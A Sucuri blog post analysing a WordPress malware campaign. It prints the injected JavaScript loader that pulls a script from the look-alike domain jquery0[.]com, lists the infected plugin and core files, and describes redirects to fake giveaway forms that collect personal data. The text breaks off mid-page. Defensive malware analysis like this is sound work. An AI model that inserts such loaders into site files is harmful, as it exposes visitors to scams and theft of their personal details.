---
title: Fake jQuery Domain Redirects Site Visitors to Scam Pages
url: https://blog.sucuri.net/2022/12/fake-jquery-domain-redirects-site-visitors-scam.html
source: Sucuri Blog
date: 2022-12-21
fetch_date: 2025-10-04T02:04:05.654741
---

# Fake jQuery Domain Redirects Site Visitors to Scam Pages

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Fake jQuery Domain Redirects Site Visitors to Scam Pages

[![](https://secure.gravatar.com/avatar/da934b974fa8adb3975fd07757f8322b04202cc98f15a625259eb3b404c1532a?s=60&d=mm&r=g)](https://blog.sucuri.net/author/kayleigh)

[Kayleigh Martin](https://blog.sucuri.net/author/kayleigh)

* December 20, 2022

![Fake jQuery Domain Redirects Site Visitors to Scam Pages](https://blog.sucuri.net/wp-content/uploads/2022/12/BlogPost_Feature-Image_1490x700_Fake-jQuery0-Domain-820x386.png)

A recent infection has been making its rounds across vulnerable WordPress sites, detected on over 160 websites so far at the time of writing. The infection is injected at the top of legitimate JavaScript files and executes a script from the following malicious domain: https://**jquery0[.]com**/JkrJYcvQ

At first glance, this domain appears to be legitimate. However, attackers have intentionally selected the domain name with the intention of deceiving webmasters. It’s nearly identical to <https://jquery.com> — a website belonging to the popular JavaScript library **jQuery**.

Website visitors may see the reputable jQuery name in the requests and assume that it’s safe to load. Unfortunately, the domain is not a perfect match and is malicious in nature. This is a common tactic used in phishing and spam campaigns to trick victims into thinking resources are legitimate.

Let’s take a look at the injection.

## JavaScript injection leverages jquery0[.]com

The following script is found injected at the top of legitimate WordPress core, theme, and plugin JavaScript files:

```
var khutmhpx = document.createElement('script');

khutmhpx.src = 'https://jquery0[.]com/JkrJYcvQ';

document.getElementsByTagName('head')[0].appendChild(khutmhpx);
```

Let’s break down what this 3 line piece of code is doing.

1. First, the code creates a new script tag with **https://jquery0[.]com/JkrJYcvQ** as its **src** parameter.
2. Next, it appends it to the current page and initiates the execution of the script.
3. Finally, the injection executes the script **https://jquery0[.]com/JkrJYcv** which then redirects users to scammy websites.

This injection has been found in a number of different WordPress files, like these for example:

* wp-includes/js/jquery/ui/**effect-transfer.min.js**
* wp-content/plugins/LayerSlider/static/layerslider/js/**greensock.js**
* wp-includes/js/jquery**/jquery.min.js**
* wp-content/plugins/woocommerce/assets/js/jquery-blockui/**jquery.blockUI.min.js**
* wp-content/plugins/revslider/public/assets/js/**jquery.themepunch.tools.min.js**
* wp-content/themes/exhibz/core/parallax/assets/js/**jarallax.js**
* wp-includes/js/dist/vendor/**wp-polyfill.min.js**
* wp-content/plugins/revslider/public/assets/js/**jquery.themepunch.tools.min.js**
* wp-content/plugins/popup-builder/public/js/**PopupConfig.js**
* wp-content/plugins/gravityforms/js/**gravityforms.min.js**
* wp-content/plugins/buddypress/bp-core/js/j**query-query.min.js**
* wp-content/plugins/showit/public/js/**showit.js**

## Dissecting the malicious jquery0[.]com domain

Let’s take a closer look at the malicious domain used in the script we just described.

Reviewing the WHOIS data for the **https://jquery0[.]com** domain can reveal a lot about it.

![WHOIS results for jQuery0 domain](https://blog.sucuri.net/wp-content/uploads/2022/12/WHOIS_results.png)

From these results, we know the following:

* The domain was purchased recently. (July 04, 2022)
* The domain is using CloudFlare, commonly used by attackers.

What’s notable is that the domain only uses CloudFlare for the Name Servers — it doesn’t use the CloudFlare firewall. DNS records point directly to IP **62[.]233[.]50[.]75** on a Russian **CHANGWAY-AS** network: <https://urlscan.io/ip/62.233.50.75>.

![jQuero0 website uses cloudflare but only for the name server, DNS points to Russian CHANGWAY-AS network](https://blog.sucuri.net/wp-content/uploads/2022/12/CHANGWAY-AS.png)

### Redirects to scam pages

Once the malicious script is initiated, end users are redirected to scam websites which coerce victims into submitting personal information. For example, one of the variants promotes the following fake Apple iPhone 13 Pro giveaway.

![Redirect to Apple iPhone 13 Pro giveaway scam](https://blog.sucuri.net/wp-content/uploads/2022/12/apple_iphone_giveaway_scam-2.png)

When the victim clicks **Ok**, they are redirected to a form that harvests sensitive personal details.

![Fake apple iphone giveaway scam form](https://blog.sucuri.net/wp-content/uploads/202...